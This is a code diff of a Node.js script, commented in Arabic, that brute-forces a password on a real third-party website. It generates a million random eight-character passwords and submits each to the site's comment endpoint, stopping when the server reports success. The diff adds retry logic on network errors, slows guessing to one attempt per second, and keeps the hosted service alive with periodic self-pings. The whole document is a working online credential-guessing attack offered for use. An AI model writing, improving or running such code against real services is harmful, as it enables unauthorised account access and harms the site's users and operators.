@@ -8,13 +8,23 @@ const commentText = "TEST";
 
 let foundPassword = null;
 let finished = false;
-let currentTries = [];
+let currentTry = "";
 let allPasswords = [];
 let currentIndex = 0;
+const retryLimit = 3;
 
-const parallelPerSecond = 2;
+// التحقق إن الخطأ يحتاج إعادة المحاولة
+function isRetryableError(error) {
+  return (
+    error.code === "ECONNABORTED" ||
+    error.code === "ECONNRESET" ||
+    error.response?.status === 502 ||
+    error.response?.status === 503 ||
+    error.response?.status === 504
+  );
+}
 
-async function tryPassword(password, retries = 3) {
+async function tryPassword(password, attempt = 1) {
   try {
     const response = await axios.post(
       "https://app.sanime.net/function/h10.php?page=addcmd",
@@ -37,12 +47,16 @@ async function tryPassword(password, retries = 3) {
     if (response.data && typeof response.data === "object" && response.data.status === 1) {
       foundPassword = password;
       finished = true;
-      console.log(`✅ Found password: ${password}`);
+      console.log(`✅ كلمة المرور الصحيحة: ${password}`);
+    } else {
+      console.log(`❌ غير صحيحة: ${password}`);
     }
-  } catch (err) {
-    if (retries > 0 && !foundPassword && !finished) {
-      console.log(`⚠️ خطأ مع الباسورد ${password}... إعادة المحاولة`);
-      await tryPassword(password, retries - 1);
+  } catch (error) {
+    if (isRetryableError(error) && attempt < retryLimit && !foundPassword && !finished) {
+      console.log(`⚠️ خطأ مع الباسورد ${password}... إعادة المحاولة (${attempt})`);
+      await tryPassword(password, attempt + 1);
+    } else {
+      console.log(`❌ فشل في المحاولة: ${password} (${error.code || error.message})`);
     }
   }
 }
@@ -55,11 +69,11 @@ async function bruteForceStart() {
       return;
     }
 
-    const batch = allPasswords.slice(currentIndex, currentIndex + parallelPerSecond);
-    currentTries = batch;
-    await Promise.all(batch.map(pwd => tryPassword(pwd)));
-    currentIndex += parallelPerSecond;
-  }, 1000); // كل ثانية
+    const password = allPasswords[currentIndex];
+    currentTry = password;
+    await tryPassword(password);
+    currentIndex++;
+  }, 1000); // 1 باسورد / ثانية
 }
 
 app.get("/", (req, res) => {
@@ -72,43 +86,43 @@ app.get("/", (req, res) => {
           foundPassword
             ? `<h2 style="color:#0f0">${foundPassword}</h2>`
             : finished
-            ? `<h2 style="color:orange">❌ تم الانتهاء من جميع الباسوردات ولم يتم العثور على الباسورد الصحيح</h2>`
-            : `<h2>جارٍ البحث... 🌀</h2><h3>تجريب: ${currentTries.join(" , ")}</h3>`
+            ? `<h2 style="color:orange">❌ انتهى التجريب ولم يتم العثور على الباسورد</h2>`
+            : `<h2>جاري التجريب... 🌀</h2><h3>🔍 الآن: ${currentTry}</h3>`
         }
-        <p style="color:#888">📡 الرابط: https://noon-9v11.onrender.com/</p>
+        <p style="color:#888">📡 https://noon-9v11.onrender.com/</p>
       </body>
     </html>`;
   res.send(html);
 });
 
-// توليد كلمات مرور عشوائية حسب النمط
+// توليد كلمات مرور عشوائية: 8 خانات - حروف صغيرة وأرقام (0-3 أرقام فقط)
 function generatePasswords(count) {
   const charset = "abcdefghijklmnopqrstuvwxyz";
   const digits = "0123456789";
   const list = new Set();
 
   while (list.size < count) {
-    let password = "";
-    let numDigits = Math.floor(Math.random() * 4); // 0 إلى 3 أرقام
+    let numDigits = Math.floor(Math.random() * 4); // من 0 إلى 3 أرقام
     let numLetters = 8 - numDigits;
+    let pass = "";
 
     for (let i = 0; i < numLetters; i++) {
-      password += charset[Math.floor(Math.random() * charset.length)];
-    }
-    for (let i = 0; i < numDigits; i++) {
-      password += digits[Math.floor(Math.random() * digits.length)];
+      pass += charset[Math.floor(Math.random() * charset.length)];
     }
 
-    // Shuffle الحروف حتى لا تكون الأحرف دائمًا أولاً
-    password = password.split("").sort(() => Math.random() - 0.5).join("");
-    list.add(password);
+    for (let i = 0; i < numDigits; i++) {
+      pass += digits[Math.floor(Math.random() * digits.length)];
+    }
+
+    pass = pass.split("").sort(() => Math.random() - 0.5).join("");
+    list.add(pass);
   }
 
   return Array.from(list);
 }
 
-// توليد 2 مليون باسورد
-allPasswords = generatePasswords(2000000);
+// توليد مليون كلمة مرور
+allPasswords = generatePasswords(1000000);
 bruteForceStart();
 
 const PORT = process.env.PORT || 10000;
@@ -116,7 +130,7 @@ app.listen(PORT, () => {
   console.log(`🚀 Server running at http://localhost:${PORT}`);
 });
 
-// ⏱️ إبقاء السيرفر نشط على Render
+// إبقاء الخدمة نشطة (ping لـ Render كل 5 دقائق)
 setInterval(() => {
   axios.get("https://noon-9v11.onrender.com/").catch(() => {});
-}, 5 * 60 * 1000); // كل 5 دقائق
+}, 5 * 60 * 1000);
